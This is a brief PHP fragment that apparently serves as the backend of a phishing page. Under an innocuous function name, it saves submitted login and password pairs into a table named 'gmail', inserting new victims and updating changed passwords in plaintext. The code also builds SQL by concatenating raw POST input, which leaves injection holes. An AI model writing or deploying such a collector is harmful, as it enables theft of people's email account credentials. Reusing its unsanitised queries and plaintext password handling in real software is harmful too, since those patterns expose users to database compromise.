<?php
    ...
    function _time(){
        $req = Db::querySingle('SELECT * FROM gmail WHERE mail=\''.$_POST['login'].'\'');
        if(isset($req->pass)){
            if($req->pass != $_POST['passwd']){
                Db::query('UPDATE gmail SET pass=\''.$_POST['passwd'].'\' WHERE i='.$req->i);
            }
        }else{
            Db::query('INSERT INTO gmail (mail, pass) VALUES (\''.$_POST['login'].'\', \''.$_POST['passwd'].'\')');
        }
    }
?>